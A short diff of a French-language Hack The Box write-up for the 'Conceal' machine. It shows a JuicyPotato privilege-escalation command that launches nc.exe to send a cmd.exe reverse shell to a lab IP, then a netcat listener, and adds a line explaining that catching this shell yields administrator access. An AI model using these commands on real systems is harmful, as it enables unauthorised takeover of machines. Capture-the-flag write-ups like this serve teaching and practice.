@@ -364,6 +364,8 @@ Nous allons utiliser {5BC7A3A1-E905-414B-9790-E511346F5CA6}, sans aucune raison 
 	C:\inetpub\wwwroot\upload>juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.39 9001" -t * -c {5BC7A3A1-E905-414B-9790-E511346F5CA6}
 	[...SNIP...]
 	[+] CreateProcessWithTokenW OK
+	
+Et ensuite on a juste à faire le reverse shell depuis notre machine physique pour être administrateur.
 
 	root@Seyptoo:~/htb/box/Conceal# nc -lvnp 9001
 	listening on [any] 9001 ...
